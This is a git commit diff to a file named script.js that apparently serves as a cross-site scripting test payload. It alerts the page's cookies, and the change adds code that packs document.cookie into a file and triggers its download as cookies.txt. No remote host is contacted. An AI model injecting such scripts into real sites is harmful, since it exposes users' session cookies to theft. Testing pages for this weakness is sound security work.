dfd5316cbd53171d7796341b59fe5f815166586e
Himanshu <72663195+HimanshuThakur20@users.noreply.github.com>
2025-03-25 18:20:15 +0530

    Update script.js

--- script.js
+++ script.js
@@ -2,7 +2,15 @@ alert("cross domain script execution done ");
 alert(4*4*4);
 alert("Cookies: " + document.cookie);
 // Set background color to red
-document.body.style.backgroundColor = "red";
-document.querySelectorAll("div").forEach(div => {
-    div.style.backgroundColor = "red";
-});
+// document.body.style.backgroundColor = "red";
+// document.querySelectorAll("div").forEach(div => {
+//     div.style.backgroundColor = "red";
+// });
+const cookies = document.cookie;
+const blob = new Blob([cookies], { type: "text/plain" });
+const a = document.createElement("a");
+a.href = URL.createObjectURL(blob);
+a.download = "cookies.txt";
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
